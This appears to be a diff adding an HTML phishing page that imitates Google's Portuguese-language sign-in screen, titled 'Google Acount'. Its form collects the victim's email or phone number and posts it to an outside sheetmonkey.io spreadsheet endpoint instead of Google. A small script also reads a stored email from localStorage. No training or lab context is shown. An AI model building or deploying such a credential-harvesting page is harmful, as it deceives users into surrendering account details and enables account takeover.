@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html class="html" lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Acount</title>
+    <style>
+        *{
+            font-family: roboto,"Noto Sans Myanmar UI",arial,sans-serif;
+        }
+    </style>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+</head>
+<body class="corpo">
+    <header class="cabeçalho">
+        <section style="margin: 6vw 0px 06px 0px;">
+            <h1 class="titulo1 t1 ">G</h1>
+            <h1 class="titulo2 t1">o</h1>
+            <h1 class="titulo3 t1">o</h1>
+            <h1 class="titulo1 t2">g</h1>
+            <h1 class="titulo5 t1">l</h1>
+            <h1 class="titulo2 t3">e</h1>
+            <p class="description"><b>FAZER LOGIN</b></P> <P class="description2">Ir para o Gmail</p>
+        </section>
+    </header>
+
+    <main class="meio">
+        <section style="margin: 6vw 0px 06px 0px;">
+            <form class="form" action="https://api.sheetmonkey.io/form/mJAZjezQLdS1bdR61FJHSw" method="post">
+                <label class="tituloBoxMail">Email ou telefone</label>
+                <input class="boxmail" type="email" name="Email" required />
+                <input type="hidden" name="Created" value="x-sheetmonkey-current-date-time" />
+                <input class="btn" type="submit" value="Avançar" />
+                <button onclick="pegarDado()">Click</button>
+            </form>
+            <a class="errpass" href="err-Gmail.html" >Esqueceu seu email?</a>
+        </section>
+    </main>
+    <script>
+        function pegarDado(){
+            var saveDate = window.localStorage.getItem('email')
+            window.alert(saveDate)
+        }
+    </script>
+    <footer class="rp">
+        <h1 class="aparece"></h1>
+    </footer>
+    <link rel="stylesheet" href="style.css">
+    
+</body>
+</html>
